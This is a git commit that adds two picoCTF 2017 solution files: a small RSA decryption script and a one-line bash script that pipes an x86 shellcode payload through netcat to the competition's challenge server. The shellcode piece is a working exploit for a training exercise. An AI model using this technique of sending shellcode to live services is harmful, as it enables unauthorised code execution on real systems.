22e3c65eeebb2ba47e50b2c7f53c12b39fec7e70
bernardosequeir <bernardosequeir@gmail.com>
2018-11-10 22:58:20 +0000

    added some files

---
+++ PicoCTF/2017/Level 1/computeRSA.py
@@ -0,0 +1,8 @@
+encrypted = 150815
+d = 1941
+N = 435979
+
+decrypted = ((encrypted)**1941) % N
+
+print decrypted
+
---
+++ PicoCTF/2017/Level2/shells_COMPLETE/get_flag.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+python -c 'print "\xB8\x40\x85\x04\x08\xFF\xD0" ' | nc shell2017.picoctf.com 29332
